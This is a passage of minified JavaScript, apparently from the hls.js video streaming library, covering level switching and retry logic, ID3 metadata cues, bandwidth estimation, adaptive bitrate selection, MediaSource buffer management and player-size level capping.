                                        i.level = e, r.trigger($e.default.LEVEL_SWITCHING, i) } var n = t[e],
                                        a = n.details; if (!a || a.live) { var s = n.urlId;
                                        r.trigger($e.default.LEVEL_LOADING, { url: n.url[s], level: e, id: s }) } } else r.trigger($e.default.ERROR, { type: Qe.ErrorTypes.OTHER_ERROR, details: Qe.ErrorDetails.LEVEL_SWITCH_ERROR, level: e, fatal: !1, reason: "invalid level idx" }) }, r.onError = function(e) { if (e.fatal) return void(e.type === Qe.ErrorTypes.NETWORK_ERROR && this.clearTimer()); var t, r = !1,
                                    i = !1; switch (e.details) {
                                    case Qe.ErrorDetails.FRAG_LOAD_ERROR:
                                    case Qe.ErrorDetails.FRAG_LOAD_TIMEOUT:
                                    case Qe.ErrorDetails.KEY_LOAD_ERROR:
                                    case Qe.ErrorDetails.KEY_LOAD_TIMEOUT:
                                        t = e.frag.level, i = !0; break;
                                    case Qe.ErrorDetails.LEVEL_LOAD_ERROR:
                                    case Qe.ErrorDetails.LEVEL_LOAD_TIMEOUT:
                                        t = e.context.level, r = !0; break;
                                    case Qe.ErrorDetails.REMUX_ALLOC_ERROR:
                                        t = e.level, r = !0 }
                                void 0 !== t && this.recoverLevel(e, t, r, i) }, r.recoverLevel = function(e, t, r, i) { var n, a, s, o = this,
                                    l = this.hls.config,
                                    u = e.details,
                                    c = this._levels[t]; if (c.loadError++, c.fragmentError = i, r) { if (!(this.levelRetryCount + 1 <= l.levelLoadingMaxRetry)) return et.logger.error("level controller, cannot recover from " + u + " error"), this.currentLevelIndex = null, this.clearTimer(), void(e.fatal = !0);
                                    a = Math.min(Math.pow(2, this.levelRetryCount) * l.levelLoadingRetryDelay, l.levelLoadingMaxRetryTimeout), this.timer = setTimeout(function() { return o.loadLevel() }, a), e.levelRetry = !0, this.levelRetryCount++, et.logger.warn("level controller, " + u + ", retry in " + a + " ms, current retry count is " + this.levelRetryCount) }(r || i) && (n = c.url.length, n > 1 && c.loadError < n ? (c.urlId = (c.urlId + 1) % n, c.details = void 0, et.logger.warn("level controller, " + u + " for level " + t + ": switching to redundant URL-id " + c.urlId)) : -1 === this.manualLevelIndex ? (s = 0 === t ? this._levels.length - 1 : t - 1, et.logger.warn("level controller, " + u + ": switch to " + s), this.hls.nextAutoLevel = this.currentLevelIndex = s) : i && (et.logger.warn("level controller, " + u + ": reload a fragment"), this.currentLevelIndex = null)) }, r.onFragLoaded = function(e) { var t = e.frag; if (void 0 !== t && "main" === t.type) { var r = this._levels[t.level];
                                    void 0 !== r && (r.fragmentError = !1, r.loadError = 0, this.levelRetryCount = 0) } }, r.onLevelLoaded = function(e) { var t = this,
                                    r = e.level,
                                    i = e.details; if (r === this.currentLevelIndex) { var n = this._levels[r]; if (n.fragmentError || (n.loadError = 0, this.levelRetryCount = 0), i.live) { var a = R(n.details, i, e.stats.trequest);
                                        et.logger.log("live playlist, reload in " + Math.round(a) + " ms"), this.timer = setTimeout(function() { return t.loadLevel() }, a) } else this.clearTimer() } }, r.onAudioTrackSwitched = function(e) { var t = this.hls.audioTracks[e.id].groupId,
                                    r = this.hls.levels[this.currentLevelIndex]; if (r && r.audioGroupIds) { for (var i = -1, n = 0; n < r.audioGroupIds.length; n++)
                                        if (r.audioGroupIds[n] === t) { i = n; break }
                                    i !== r.urlId && (r.urlId = i, this.startLoad()) } }, r.loadLevel = function() { if (et.logger.debug("call to loadLevel"), null !== this.currentLevelIndex && this.canload) { var e = this._levels[this.currentLevelIndex]; if ("object" == typeof e && e.url.length > 0) { var t = this.currentLevelIndex,
                                            r = e.urlId,
                                            i = e.url[r];
                                        et.logger.log("Attempt loading level index " + t + " with URL-id " + r), this.hls.trigger($e.default.LEVEL_LOADING, { url: i, level: t, id: r }) } } }, r.removeLevel = function(e, t) { var r = this.levels.filter(function(r, i) { return i !== e || r.url.length > 1 && void 0 !== t && (r.url = r.url.filter(function(e, r) { return r !== t }), r.urlId = 0, !0) }).map(function(e, t) { var r = e.details; return r && r.fragments && r.fragments.forEach(function(e) { e.level = t }), e });
                                this._levels = r, this.hls.trigger($e.default.LEVELS_UPDATED, { levels: r }) }, W(t, [{ key: "levels", get: function() { return this._levels } }, { key: "level", get: function() { return this.currentLevelIndex }, set: function(e) { var t = this._levels;
                                    t && (e = Math.min(e, t.length - 1), this.currentLevelIndex === e && t[e].details || this.setLevelInternal(e)) } }, { key: "manualLevel", get: function() { return this.manualLevelIndex }, set: function(e) { this.manualLevelIndex = e, void 0 === this._startLevel && (this._startLevel = e), -1 !== e && (this.level = e) } }, { key: "firstLevel", get: function() { return this._firstLevel }, set: function(e) { this._firstLevel = e } }, { key: "startLevel", get: function() { if (void 0 === this._startLevel) { var e = this.hls.config.startLevel; return void 0 !== e ? e : this._firstLevel } return this._startLevel }, set: function(e) { this._startLevel = e } }, { key: "nextLoadLevel", get: function() { return -1 !== this.manualLevelIndex ? this.manualLevelIndex : this.hls.nextAutoLevel }, set: function(e) { this.level = e, -1 === this.manualLevelIndex && (this.hls.nextAutoLevel = e) } }]), t }(it),
                        $t = r("./src/demux/id3.js"),
                        er = function(e) {
                            function t(t) { var r; return r = e.call(this, t, $e.default.MEDIA_ATTACHED, $e.default.MEDIA_DETACHING, $e.default.FRAG_PARSING_METADATA, $e.default.LIVE_BACK_BUFFER_REACHED) || this, r.id3Track = void 0, r.media = void 0, r }
                            Q(t, e); var r = t.prototype; return r.destroy = function() { it.prototype.destroy.call(this) }, r.onMediaAttached = function(e) { this.media = e.media, this.media }, r.onMediaDetaching = function() { X(this.id3Track), this.id3Track = void 0, this.media = void 0 }, r.getID3Track = function(e) { for (var t = 0; t < e.length; t++) { var r = e[t]; if ("metadata" === r.kind && "id3" === r.label) return Y(r, this.media), r } return this.media.addTextTrack("metadata", "id3") }, r.onFragParsingMetadata = function(e) { var t = e.frag,
                                    r = e.samples;
                                this.id3Track || (this.id3Track = this.getID3Track(this.media.textTracks), this.id3Track.mode = "hidden"); for (var i = window.WebKitDataCue || window.VTTCue || window.TextTrackCue, n = 0; n < r.length; n++) { var a = $t.default.getID3Frames(r[n].data); if (a) { var s = Math.max(r[n].pts, 0),
                                            o = n < r.length - 1 ? r[n + 1].pts : t.endPTS;
                                        o || (o = t.start + t.duration);
                                        o - s <= 0 && (o = s + .25); for (var l = 0; l < a.length; l++) { var u = a[l]; if (!$t.default.isTimeStampFrame(u)) { var c = new i(s, o, "");
                                                c.value = u, this.id3Track.addCue(c) } } } } }, r.onLiveBackBufferReached = function(e) { var t = e.bufferEnd,
                                    r = this.id3Track; if (r && r.cues && r.cues.length) { var i = J(r.cues, t); if (i)
                                        for (; r.cues[0] !== i;) r.removeCue(r.cues[0]) } }, t }(it),
                        tr = er,
                        rr = function() {
                            function e(e) { this.alpha_ = void 0, this.estimate_ = void 0, this.totalWeight_ = void 0, this.alpha_ = e ? Math.exp(Math.log(.5) / e) : 0, this.estimate_ = 0, this.totalWeight_ = 0 } var t = e.prototype; return t.sample = function(e, t) { var r = Math.pow(this.alpha_, e);
                                this.estimate_ = t * (1 - r) + r * this.estimate_, this.totalWeight_ += e }, t.getTotalWeight = function() { return this.totalWeight_ }, t.getEstimate = function() { if (this.alpha_) { var e = 1 - Math.pow(this.alpha_, this.totalWeight_); return this.estimate_ / e } return this.estimate_ }, e }(),
                        ir = rr,
                        nr = function() {
                            function e(e, t, r, i) { this.hls = void 0, this.defaultEstimate_ = void 0, this.minWeight_ = void 0, this.minDelayMs_ = void 0, this.slow_ = void 0, this.fast_ = void 0, this.hls = e, this.defaultEstimate_ = i, this.minWeight_ = .001, this.minDelayMs_ = 50, this.slow_ = new ir(t), this.fast_ = new ir(r) } var t = e.prototype; return t.sample = function(e, t) { e = Math.max(e, this.minDelayMs_); var r = 8 * t,
                                    i = e / 1e3,
                                    n = r / i;
                                this.fast_.sample(i, n), this.slow_.sample(i, n) }, t.canEstimate = function() { var e = this.fast_; return e && e.getTotalWeight() >= this.minWeight_ }, t.getEstimate = function() { return this.canEstimate() ? Math.min(this.fast_.getEstimate(), this.slow_.getEstimate()) : this.defaultEstimate_ }, t.destroy = function() {}, e }(),
                        ar = nr,
                        sr = window,
                        or = sr.performance,
                        lr = function(e) {
                            function t(t) { var r; return r = e.call(this, t, $e.default.FRAG_LOADING, $e.default.FRAG_LOADED, $e.default.FRAG_BUFFERED, $e.default.ERROR) || this, r.lastLoadedFragLevel = 0, r._nextAutoLevel = -1, r.hls = t, r.timer = null, r._bwEstimator = null, r.onCheck = r._abandonRulesCheck.bind(te(r)), r }
                            re(t, e); var r = t.prototype; return r.destroy = function() { this.clearTimer(), it.prototype.destroy.call(this) }, r.onFragLoading = function(e) { var t = e.frag; if ("main" === t.type && (this.timer || (this.fragCurrent = t, this.timer = setInterval(this.onCheck, 100)), !this._bwEstimator)) { var r, i, n = this.hls,
                                        a = n.config,
                                        s = t.level,
                                        o = n.levels[s].details.live;
                                    o ? (r = a.abrEwmaFastLive, i = a.abrEwmaSlowLive) : (r = a.abrEwmaFastVoD, i = a.abrEwmaSlowVoD), this._bwEstimator = new ar(n, i, r, a.abrEwmaDefaultEstimate) } }, r._abandonRulesCheck = function() { var e = this.hls,
                                    t = e.media,
                                    r = this.fragCurrent; if (r) { var i = r.loader; if (!i || i.stats && i.stats.aborted) return et.logger.warn("frag loader destroy or aborted, disarm abandonRules"), this.clearTimer(), void(this._nextAutoLevel = -1); var n = i.stats; if (t && n && (!t.paused && 0 !== t.playbackRate || !t.readyState) && r.autoLevel && r.level) { var a = or.now() - n.trequest,
                                            s = Math.abs(t.playbackRate); if (a > 500 * r.duration / s) { var o = e.levels,
                                                l = Math.max(1, n.bw ? n.bw / 8 : 1e3 * n.loaded / a),
                                                u = o[r.level]; if (!u) return; var c = u.realBitrate ? Math.max(u.realBitrate, u.bitrate) : u.bitrate,
                                                d = n.total ? n.total : Math.max(n.loaded, Math.round(r.duration * c / 8)),
                                                f = t.currentTime,
                                                h = (d - n.loaded) / l,
                                                g = (Mt.bufferInfo(t, f, e.config.maxBufferHole).end - f) / s; if (g < 2 * r.duration / s && h > g) { var p, v, m = e.minAutoLevel; for (v = r.level - 1; v > m; v--) { var y = o[v].realBitrate ? Math.max(o[v].realBitrate, o[v].bitrate) : o[v].bitrate; if (r.duration * y / (6.4 * l) < g) break }
                                                p < h && (et.logger.warn("loading too slow, abort fragment loading and switch to level " + v + ":fragLoadedDelay[" + v + "]<fragLoadedDelay[" + (r.level - 1) + "];bufferStarvationDelay:" + p.toFixed(1) + "<" + h.toFixed(1) + ":" + g.toFixed(1)), e.nextLoadLevel = v, this._bwEstimator.sample(a, n.loaded), i.abort(), this.clearTimer(), e.trigger($e.default.FRAG_LOAD_EMERGENCY_ABORTED, { frag: r, stats: n })) } } } } }, r.onFragLoaded = function(e) { var t = e.frag; if ("main" === t.type && Object(Ze.isFiniteNumber)(t.sn)) { if (this.clearTimer(), this.lastLoadedFragLevel = t.level, this._nextAutoLevel = -1, this.hls.config.abrMaxWithRealBitrate) { var r = this.hls.levels[t.level],
                                            i = (r.loaded ? r.loaded.bytes : 0) + e.stats.loaded,
                                            n = (r.loaded ? r.loaded.duration : 0) + e.frag.duration;
                                        r.loaded = { bytes: i, duration: n }, r.realBitrate = Math.round(8 * i / n) } if (e.frag.bitrateTest) { var a = e.stats;
                                        a.tparsed = a.tbuffered = a.tload, this.onFragBuffered(e) } } }, r.onFragBuffered = function(e) { var t = e.stats,
                                    r = e.frag; if (!0 !== t.aborted && "main" === r.type && Object(Ze.isFiniteNumber)(r.sn) && (!r.bitrateTest || t.tload === t.tbuffered)) { var i = t.tparsed - t.trequest;
                                    et.logger.log("latency/loading/parsing/append/kbps:" + Math.round(t.tfirst - t.trequest) + "/" + Math.round(t.tload - t.tfirst) + "/" + Math.round(t.tparsed - t.tload) + "/" + Math.round(t.tbuffered - t.tparsed) + "/" + Math.round(8 * t.loaded / (t.tbuffered - t.trequest))), this._bwEstimator.sample(i, t.loaded), t.bwEstimate = this._bwEstimator.getEstimate(), r.bitrateTest ? this.bitrateTestDelay = i / 1e3 : this.bitrateTestDelay = 0 } }, r.onError = function(e) { switch (e.details) {
                                    case Qe.ErrorDetails.FRAG_LOAD_ERROR:
                                    case Qe.ErrorDetails.FRAG_LOAD_TIMEOUT:
                                        this.clearTimer() } }, r.clearTimer = function() { clearInterval(this.timer), this.timer = null }, r._findBestLevel = function(e, t, r, i, n, a, s, o, l) { for (var u = n; u >= i; u--) { var c = l[u]; if (c) { var d = c.details,
                                            f = d ? d.totalduration / d.fragments.length : t,
                                            h = !!d && d.live,
                                            g = void 0;
                                        g = u <= e ? s * r : o * r; var p = l[u].realBitrate ? Math.max(l[u].realBitrate, l[u].bitrate) : l[u].bitrate,
                                            v = p * f / g; if (et.logger.trace("level/adjustedbw/bitrate/avgDuration/maxFetchDuration/fetchDuration: " + u + "/" + Math.round(g) + "/" + p + "/" + f + "/" + a + "/" + v), g > p && (!v || h && !this.bitrateTestDelay || v < a)) return u } } return -1 }, ee(t, [{ key: "nextAutoLevel", get: function() { var e = this._nextAutoLevel,
                                        t = this._bwEstimator; if (!(-1 === e || t && t.canEstimate())) return e; var r = this._nextABRAutoLevel; return -1 !== e && (r = Math.min(e, r)), r }, set: function(e) { this._nextAutoLevel = e } }, { key: "_nextABRAutoLevel", get: function() { var e = this.hls,
                                        t = e.maxAutoLevel,
                                        r = e.levels,
                                        i = e.config,
                                        n = e.minAutoLevel,
                                        a = e.media,
                                        s = this.lastLoadedFragLevel,
                                        o = this.fragCurrent ? this.fragCurrent.duration : 0,
                                        l = a ? a.currentTime : 0,
                                        u = a && 0 !== a.playbackRate ? Math.abs(a.playbackRate) : 1,
                                        c = this._bwEstimator ? this._bwEstimator.getEstimate() : i.abrEwmaDefaultEstimate,
                                        d = (Mt.bufferInfo(a, l, i.maxBufferHole).end - l) / u,
                                        f = this._findBestLevel(s, o, c, n, t, d, i.abrBandWidthFactor, i.abrBandWidthUpFactor, r); if (f >= 0) return f;
                                    et.logger.trace("rebuffering expected to happen, lets try to find a quality level minimizing the rebuffering"); var h = o ? Math.min(o, i.maxStarvationDelay) : i.maxStarvationDelay,
                                        g = i.abrBandWidthFactor,
                                        p = i.abrBandWidthUpFactor; if (0 === d) { var v = this.bitrateTestDelay; if (v) { h = (o ? Math.min(o, i.maxLoadingDelay) : i.maxLoadingDelay) - v, et.logger.trace("bitrate test took " + Math.round(1e3 * v) + "ms, set first fragment max fetchDuration to " + Math.round(1e3 * h) + " ms"), g = p = 1 } } return f = this._findBestLevel(s, o, c, n, t, d + h, g, p, r), Math.max(f, 0) } }]), t }(it),
                        ur = lr,
                        cr = m(),
                        dr = function(e) {
                            function t(t) { var r; return r = e.call(this, t, $e.default.MEDIA_ATTACHING, $e.default.MEDIA_DETACHING, $e.default.MANIFEST_PARSED, $e.default.BUFFER_RESET, $e.default.BUFFER_APPENDING, $e.default.BUFFER_CODECS, $e.default.BUFFER_EOS, $e.default.BUFFER_FLUSHING, $e.default.LEVEL_PTS_UPDATED, $e.default.LEVEL_UPDATED) || this, r._msDuration = null, r._levelDuration = null, r._levelTargetDuration = 10, r._live = null, r._objectUrl = null, r._needsFlush = !1, r._needsEos = !1, r.config = void 0, r.audioTimestampOffset = void 0, r.bufferCodecEventsExpected = 0, r._bufferCodecEventsTotal = 0, r.media = null, r.mediaSource = null, r.segments = [], r.parent = void 0, r.appending = !1, r.appended = 0, r.appendError = 0, r.flushBufferCounter = 0, r.tracks = {}, r.pendingTracks = {}, r.sourceBuffer = {}, r.flushRange = [], r._onMediaSourceOpen = function() { et.logger.log("media source opened"), r.hls.trigger($e.default.MEDIA_ATTACHED, { media: r.media }); var e = r.mediaSource;
                                    e && e.removeEventListener("sourceopen", r._onMediaSourceOpen), r.checkPendingTracks() }, r._onMediaSourceClose = function() { et.logger.log("media source closed") }, r._onMediaSourceEnded = function() { et.logger.log("media source ended") }, r._onSBUpdateEnd = function() { if (r.audioTimestampOffset && r.sourceBuffer.audio) { var e = r.sourceBuffer.audio;
                                        et.logger.warn("change mpeg audio timestamp offset from " + e.timestampOffset + " to " + r.audioTimestampOffset), e.timestampOffset = r.audioTimestampOffset, delete r.audioTimestampOffset }
                                    r._needsFlush && r.doFlush(), r._needsEos && r.checkEos(), r.appending = !1; var t = r.parent,
                                        i = r.segments.reduce(function(e, r) { return r.parent === t ? e + 1 : e }, 0),
                                        n = {},
                                        a = r.sourceBuffer; for (var s in a) { var o = a[s]; if (!o) throw Error("handling source buffer update end error: source buffer for " + s + " uninitilized and unable to update buffered TimeRanges.");
                                        n[s] = o.buffered }
                                    r.hls.trigger($e.default.BUFFER_APPENDED, { parent: t, pending: i, timeRanges: n }), r._needsFlush || r.doAppending(), r.updateMediaElementDuration(), 0 === i && r.flushLiveBackBuffer() }, r._onSBUpdateError = function(e) { et.logger.error("sourceBuffer error:", e), r.hls.trigger($e.default.ERROR, { type: Qe.ErrorTypes.MEDIA_ERROR, details: Qe.ErrorDetails.BUFFER_APPENDING_ERROR, fatal: !1 }) }, r.config = t.config, r }
                            ie(t, e); var r = t.prototype; return r.destroy = function() { it.prototype.destroy.call(this) }, r.onLevelPtsUpdated = function(e) { var t = e.type,
                                    r = this.tracks.audio; if ("audio" === t && r && "audio/mpeg" === r.container) { var i = this.sourceBuffer.audio; if (!i) throw Error("Level PTS Updated and source buffer for audio uninitalized"); if (Math.abs(i.timestampOffset - e.start) > .1) { var n = i.updating; try { i.abort() } catch (e) { et.logger.warn("can not abort audio buffer: " + e) }
                                        n ? this.audioTimestampOffset = e.start : (et.logger.warn("change mpeg audio timestamp offset from " + i.timestampOffset + " to " + e.start), i.timestampOffset = e.start) } } }, r.onManifestParsed = function(e) { var t = 2;
                                (e.audio && !e.video || !e.altAudio) && (t = 1), this.bufferCodecEventsExpected = this._bufferCodecEventsTotal = t, et.logger.log(this.bufferCodecEventsExpected + " bufferCodec event(s) expected") }, r.onMediaAttaching = function(e) { var t = this.media = e.media; if (t && cr) { var r = this.mediaSource = new cr;
                                    r.addEventListener("sourceopen", this._onMediaSourceOpen), r.addEventListener("sourceended", this._onMediaSourceEnded), r.addEventListener("sourceclose", this._onMediaSourceClose), t.src = window.URL.createObjectURL(r), this._objectUrl = t.src } }, r.onMediaDetaching = function() { et.logger.log("media source detaching"); var e = this.mediaSource; if (e) { if ("open" === e.readyState) try { e.endOfStream() } catch (e) { et.logger.warn("onMediaDetaching:" + e.message + " while calling endOfStream") }
                                    e.removeEventListener("sourceopen", this._onMediaSourceOpen), e.removeEventListener("sourceended", this._onMediaSourceEnded), e.removeEventListener("sourceclose", this._onMediaSourceClose), this.media && (this._objectUrl && window.URL.revokeObjectURL(this._objectUrl), this.media.src === this._objectUrl ? (this.media.removeAttribute("src"), this.media.load()) : et.logger.warn("media.src was changed by a third party - skip cleanup")), this.mediaSource = null, this.media = null, this._objectUrl = null, this.bufferCodecEventsExpected = this._bufferCodecEventsTotal, this.pendingTracks = {}, this.tracks = {}, this.sourceBuffer = {}, this.flushRange = [], this.segments = [], this.appended = 0 }
                                this.hls.trigger($e.default.MEDIA_DETACHED) }, r.checkPendingTracks = function() { var e = this.bufferCodecEventsExpected,
                                    t = this.pendingTracks,
                                    r = Object.keys(t).length;
                                (r && !e || 2 === r) && (this.createSourceBuffers(t), this.pendingTracks = {}, this.doAppending()) }, r.onBufferReset = function() { var e = this.sourceBuffer; for (var t in e) { var r = e[t]; try { r && (this.mediaSource && this.mediaSource.removeSourceBuffer(r), r.removeEventListener("updateend", this._onSBUpdateEnd), r.removeEventListener("error", this._onSBUpdateError)) } catch (e) {} }
                                this.sourceBuffer = {}, this.flushRange = [], this.segments = [], this.appended = 0 }, r.onBufferCodecs = function(e) { var t = this;
                                Object.keys(this.sourceBuffer).length || (Object.keys(e).forEach(function(r) { t.pendingTracks[r] = e[r] }), this.bufferCodecEventsExpected = Math.max(this.bufferCodecEventsExpected - 1, 0), this.mediaSource && "open" === this.mediaSource.readyState && this.checkPendingTracks()) }, r.createSourceBuffers = function(e) { var t = this.sourceBuffer,
                                    r = this.mediaSource; if (!r) throw Error("createSourceBuffers called when mediaSource was null"); for (var i in e)
                                    if (!t[i]) { var n = e[i]; if (!n) throw Error("source buffer exists for track " + i + ", however track does not"); var a = n.levelCodec || n.codec,
                                            s = n.container + ";codecs=" + a;
                                        et.logger.log("creating sourceBuffer(" + s + ")"); try { var o = t[i] = r.addSourceBuffer(s);
                                            o.addEventListener("updateend", this._onSBUpdateEnd), o.addEventListener("error", this._onSBUpdateError), this.tracks[i] = { buffer: o, codec: a, id: n.id, container: n.container, levelCodec: n.levelCodec } } catch (e) { et.logger.error("error while trying to add sourceBuffer:" + e.message), this.hls.trigger($e.default.ERROR, { type: Qe.ErrorTypes.MEDIA_ERROR, details: Qe.ErrorDetails.BUFFER_ADD_CODEC_ERROR, fatal: !1, err: e, mimeType: s }) } }
                                this.hls.trigger($e.default.BUFFER_CREATED, { tracks: this.tracks }) }, r.onBufferAppending = function(e) { this._needsFlush || (this.segments ? this.segments.push(e) : this.segments = [e], this.doAppending()) }, r.onBufferEos = function(e) { for (var t in this.sourceBuffer)
                                    if (!e.type || e.type === t) { var r = this.sourceBuffer[t];
                                        r && !r.ended && (r.ended = !0, et.logger.log(t + " sourceBuffer now EOS")) }
                                this.checkEos() }, r.checkEos = function() { var e = this.sourceBuffer,
                                    t = this.mediaSource; if (!t || "open" !== t.readyState) return void(this._needsEos = !1); for (var r in e) { var i = e[r]; if (i) { if (!i.ended) return; if (i.updating) return void(this._needsEos = !0) } }
                                et.logger.log("all media data are available, signal endOfStream() to MediaSource and stop loading fragment"); try { t.endOfStream() } catch (e) { et.logger.warn("exception while calling mediaSource.endOfStream()") }
                                this._needsEos = !1 }, r.onBufferFlushing = function(e) { e.type ? this.flushRange.push({ start: e.startOffset, end: e.endOffset, type: e.type }) : (this.flushRange.push({ start: e.startOffset, end: e.endOffset, type: "video" }), this.flushRange.push({ start: e.startOffset, end: e.endOffset, type: "audio" })), this.flushBufferCounter = 0, this.doFlush() }, r.flushLiveBackBuffer = function() { if (this._live) { var e = this.config.liveBackBufferLength; if (isFinite(e) && !(e < 0)) { if (!this.media) return void et.logger.error("flushLiveBackBuffer called without attaching media"); for (var t = this.media.currentTime, r = this.sourceBuffer, i = Object.keys(r), n = t - Math.max(e, this._levelTargetDuration), a = i.length - 1; a >= 0; a--) { var s = i[a],
                                                o = r[s]; if (o) { var l = o.buffered;
                                                l.length > 0 && n > l.start(0) && this.removeBufferRange(s, o, 0, n) && this.hls.trigger($e.default.LIVE_BACK_BUFFER_REACHED, { bufferEnd: n }) } } } } }, r.onLevelUpdated = function(e) { var t = e.details;
                                t.fragments.length > 0 && (this._levelDuration = t.totalduration + t.fragments[0].start, this._levelTargetDuration = t.averagetargetduration || t.targetduration || 10, this._live = t.live, this.updateMediaElementDuration()) }, r.updateMediaElementDuration = function() { var e, t = this.config; if (null !== this._levelDuration && this.media && this.mediaSource && this.sourceBuffer && 0 !== this.media.readyState && "open" === this.mediaSource.readyState) { for (var r in this.sourceBuffer) { var i = this.sourceBuffer[r]; if (i && !0 === i.updating) return }
                                    e = this.media.duration, null === this._msDuration && (this._msDuration = this.mediaSource.duration), !0 === this._live && !0 === t.liveDurationInfinity ? (et.logger.log("Media Source duration is set to Infinity"), this._msDuration = this.mediaSource.duration = 1 / 0) : (this._levelDuration > this._msDuration && this._levelDuration > e || !Object(Ze.isFiniteNumber)(e)) && (et.logger.log("Updating Media Source duration to " + this._levelDuration.toFixed(3)), this._msDuration = this.mediaSource.duration = this._levelDuration) } }, r.doFlush = function() { for (; this.flushRange.length;) { var e = this.flushRange[0]; if (!this.flushBuffer(e.start, e.end, e.type)) return void(this._needsFlush = !0);
                                    this.flushRange.shift(), this.flushBufferCounter = 0 } if (0 === this.flushRange.length) { this._needsFlush = !1; var t = 0,
                                        r = this.sourceBuffer; try { for (var i in r) { var n = r[i];
                                            n && (t += n.buffered.length) } } catch (e) { et.logger.error("error while accessing sourceBuffer.buffered") }
                                    this.appended = t, this.hls.trigger($e.default.BUFFER_FLUSHED) } }, r.doAppending = function() { var e = this.config,
                                    t = this.hls,
                                    r = this.segments,
                                    i = this.sourceBuffer; if (Object.keys(i).length) { if (!this.media || this.media.error) return this.segments = [], void et.logger.error("trying to append although a media error occured, flush segment and abort"); if (!this.appending) { var n = r.shift(); if (n) try { var a = i[n.type]; if (!a) return void this._onSBUpdateEnd(); if (a.updating) return void r.unshift(n);
                                            a.ended = !1, this.parent = n.parent, a.appendBuffer(n.data), this.appendError = 0, this.appended++, this.appending = !0 } catch (i) { et.logger.error("error while trying to append buffer:" + i.message), r.unshift(n); var s = { type: Qe.ErrorTypes.MEDIA_ERROR, parent: n.parent, details: "", fatal: !1 };
                                            22 === i.code ? (this.segments = [], s.details = Qe.ErrorDetails.BUFFER_FULL_ERROR) : (this.appendError++, s.details = Qe.ErrorDetails.BUFFER_APPEND_ERROR, this.appendError > e.appendErrorMaxRetry && (et.logger.log("fail " + e.appendErrorMaxRetry + " times to append segment in sourceBuffer"), this.segments = [], s.fatal = !0)), t.trigger($e.default.ERROR, s) } } } }, r.flushBuffer = function(e, t, r) { var i = this.sourceBuffer; if (!Object.keys(i).length) return !0; var n = "null"; if (this.media && (n = this.media.currentTime.toFixed(3)), et.logger.log("flushBuffer,pos/start/end: " + n + "/" + e + "/" + t), this.flushBufferCounter >= this.appended) return et.logger.warn("abort flushing too many retries"), !0; var a = i[r]; if (a) { if (a.ended = !1, a.updating) return et.logger.warn("cannot flush, sb updating in progress"), !1; if (this.removeBufferRange(r, a, e, t)) return this.flushBufferCounter++, !1 } return et.logger.log("buffer flushed"), !0 }, r.removeBufferRange = function(e, t, r, i) { try { for (var n = 0; n < t.buffered.length; n++) { var a = t.buffered.start(n),
                                            s = t.buffered.end(n),
                                            o = Math.max(a, r),
                                            l = Math.min(s, i); if (Math.min(l, s) - o > .5) { var u = "null"; return this.media && (u = this.media.currentTime.toString()), et.logger.log("sb remove " + e + " [" + o + "," + l + "], of [" + a + "," + s + "], pos:" + u), t.remove(o, l), !0 } } } catch (e) { et.logger.warn("removeBufferRange failed", e) } return !1 }, t }(it),
                        fr = dr,
                        hr = function(e) {
                            function t(t) { var r; return r = e.call(this, t, $e.default.FPS_DROP_LEVEL_CAPPING, $e.default.MEDIA_ATTACHING, $e.default.MANIFEST_PARSED, $e.default.LEVELS_UPDATED, $e.default.BUFFER_CODECS, $e.default.MEDIA_DETACHING) || this, r.autoLevelCapping = Number.POSITIVE_INFINITY, r.firstLevel = null, r.levels = [], r.media = null, r.restrictedLevels = [], r.timer = null, r.clientRect = null, r }
                            se(t, e); var r = t.prototype; return r.destroy = function() { this.hls.config.capLevelToPlayerSize && (this.media = null, this.clientRect = null, this.stopCapping()) }, r.onFpsDropLevelCapping = function(e) { t.isLevelAllowed(e.droppedLevel, this.restrictedLevels) && this.restrictedLevels.push(e.droppedLevel) }, r.onMediaAttaching = function(e) { this.media = e.media instanceof window.HTMLVideoElement ? e.media : null }, r.onManifestParsed = function(e) { var t = this.hls;
                                this.restrictedLevels = [], this.levels = e.levels, this.firstLevel = e.firstLevel, t.config.capLevelToPlayerSize && e.video && this.startCapping() }, r.onBufferCodecs = function(e) { this.hls.config.capLevelToPlayerSize && e.video && this.startCapping() }, r.onLevelsUpdated = function(e) { this.levels = e.levels }, r.onMediaDetaching = function() { this.stopCapping() }, r.detectPlayerSize = function() { if (this.media) { var e = this.levels ? this.levels.length : 0; if (e) { var t = this.hls;
                                        t.autoLevelCapping = this.getMaxLevel(e - 1), t.autoLevelCapping > this.autoLevelCapping && t.streamController.nextLevelSwitch(), this.autoLevelCapping = t.autoLevelCapping } } }, r.getMaxLevel = function(e) { var r = this; if (!this.levels) return -1; var i = this.levels.filter(function(i, n) { return t.isLevelAllowed(n, r.restrictedLevels) && n <= e }); return this.clientRect = null, t.getMaxLevelByMediaSize(i, this.mediaWidth, this.mediaHeight) }, r.startCapping = function() { this.timer || (this.autoLevelCapping = Number.POSITIVE_INFINITY, this.hls.firstLevel = this.getMaxLevel(this.firstLevel), clearInterval(this.timer), this.timer = setInterval(this.detectPlayerSize.bind(this), 1e3), this.detectPlayerSize()) }, r.stopCapping = function() { this.restrictedLevels = [], this.firstLevel = null, this.autoLevelCapping = Number.POSITIVE_INFINITY, this.timer && (this.timer = clearInterval(this.timer), this.timer = null) }, r.getDimensions = function() { if (this.clientRect) return this.clientRect; var e = this.media,
                                    t = { width: 0, height: 0 }; if (e) { var r = e.getBoundingClientRect();
                                    t.width = r.width, t.height = r.height, t.width || t.height || (t.width = r.right - r.left || e.width || 0, t.height = r.bottom - r.top || e.height || 0) } return this.clientRect = t, t }, t.isLevelAllowed = function(e, t) { return void 0 === t && (t = []), -1 === t.indexOf(e) }, t.getMaxLevelByMediaSize = function(e, t, r) { if (!e || e && !e.length) return -1; for (var i = e.length - 1, n = 0; n < e.length; n += 1) { var a = e[n]; if ((a.width >= t || a.height >= r) && function(e, t) { return !t || (e.width !== t.width || e.height !== t.height) }(a, e[n + 1])) { i = n; break } } return i }, ae(t, [{ key: "mediaWidth", get: function() { return this.getDimensions().width * t.contentScaleFactor } }, { key: "mediaHeight", get: function() { return this.getDimensions().height * t.contentScaleFactor } }], [{ key: "contentScaleFactor", get: function() { var e = 1; try { e = window.devicePixelRatio } catch (e) {} return e } }]), t }(it),
                        gr = hr,
                        pr = window,
                        vr = pr.performance,
                        mr = function(e) {
                            function t(t) { return e.call(this, t, $e.default.MEDIA_ATTACHING) || this }
